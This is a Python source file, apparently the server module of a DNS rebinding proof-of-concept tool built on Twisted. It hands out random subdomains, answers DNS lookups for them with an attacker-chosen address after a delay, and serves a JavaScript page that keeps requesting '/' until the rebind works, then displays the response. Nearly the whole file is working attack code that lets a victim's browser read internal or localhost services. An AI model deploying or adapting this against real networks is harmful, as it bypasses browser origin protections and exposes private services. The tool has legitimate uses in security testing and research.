import random
import time

from twisted.web.resource import Resource

html_instructions = """
"""

html_rebind = """
<html>
<body>
  <h1>DNS Rebinding PoC - Rebinding to {rebind_address}</h1>
  <h2>Sending rebind request in <span id="counter">...</span> seconds</h2>
<div id="log"></div>
<script>
var rebindTimer = 20;
var rebindPath = "/";

function log(msg) {
  var text = document.createTextNode(msg);
  var pre = document.createElement("pre");
  pre.setAttribute("style", "white-space: pre-wrap;");
  pre.appendChild(text);
  document.getElementById("log").appendChild(pre);
}

function countdown() {
  var interval;
  var counter = rebindTimer;

  function step() {
    counter -= 1;
    document.getElementById("counter").innerHTML = counter;
    if (counter == 0) {
      clearInterval(interval)
    }
  }
  interval = setInterval(function(){ step() }, 1000);
}

async function run() {
  try {
    var resp = await fetch(rebindPath).then((response) => response.text());
    log("[+] Success");
    log(resp);
  }
  catch(e) {
    log("[-] Retrying...");
    countdown();
    return setTimeout(run, rebindTimer * 1000);
  }
}

log("Starting...");
countdown();
setTimeout(run, rebindTimer * 1000);
</script>
</body>
</html>
"""

rebind_mappings = {}

class RebindPage(Resource):
    isLeaf = True

    def render_GET(self, request):
        print("render_GET called", request.path)
        domain = request.getRequestHostname().decode()
        path = request.path.decode()

        if path.startswith("/reset"):
            rebind_mappings.clear()
            request.setResponseCode(302)
            request.setHeader("Location", "/")
            request.setHeader("Content-Type", "text/html; charset=UTF-8")
            return "Redirecting...".encode()

        elif path.startswith("/set/"):
            address = path.split("/set/")[1]
            rebindtag = "t" + "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(6))
            scheme = "https" if request.isSecure() else "http"
            location = "{}://{}.{}/get/{}".format(scheme, rebindtag, domain, address)

            request.setResponseCode(302)
            request.setHeader("Location", location)
            request.setHeader("Content-Type", "text/html; charset=UTF-8")
            return "Redirecting...".encode()

        elif path.startswith("/get/"):
            address = path.split("/get/")[1]
            rebindtag = domain.split(".dnsrebind.")[0]

            rebind_mappings[rebindtag] = {}
            rebind_mappings[rebindtag]["address"] = address
            rebind_mappings[rebindtag]["time"] = time.time() + 2
            return html_rebind.replace("{rebind_address}", address).encode()

        return html_instructions.encode()


def get_record(lookup_name, lookup_cls, lookup_type):
    rebindtag = lookup_name.decode().split(".dnsrebind.")[0]
    if rebindtag in rebind_mappings:
        if rebind_mappings[rebindtag]["time"] < time.time():
            return rebind_mappings[rebindtag]["address"]

    return "{ipv4}"


def get_resource(request):
    return RebindPage()
